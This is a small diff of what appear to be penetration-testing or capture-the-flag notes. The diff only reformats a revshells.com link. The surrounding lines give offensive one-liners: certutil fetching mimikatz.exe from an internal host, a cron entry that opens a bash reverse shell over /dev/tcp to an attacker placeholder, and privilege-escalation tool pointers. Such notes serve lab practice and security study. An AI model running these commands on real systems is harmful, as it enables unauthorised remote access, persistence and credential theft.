@@ -83,5 +83,5 @@ certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
 - use **lastlog** see who has last logged in remotely.
 - use https://github.com/itm4n/PrivescCheck powershell script for privilege escalation in windows.
 - use the following for linux persistence through cron: ***** /bin/bash -c 'bash -i &> /dev/tcp/<LHOST>/<LPORT> 0>&1'
-- After getting a reverse shell through .php, .c, .py or .exe files, use revshells.com to get a reverse shell to get a netcat shell on the attacker machine. This increases the extent of accessibility.
+- After getting a reverse shell through .php, .c, .py or .exe files, use [revshells.com](https://www.revshells.com/) to get a reverse shell to get a netcat shell on the attacker machine. This increases the extent of accessibility.
 - Next setup a python server on the directory containing linux-exploit-suggester or windows-exploit-suggester for privilege escalation based on the target machine.
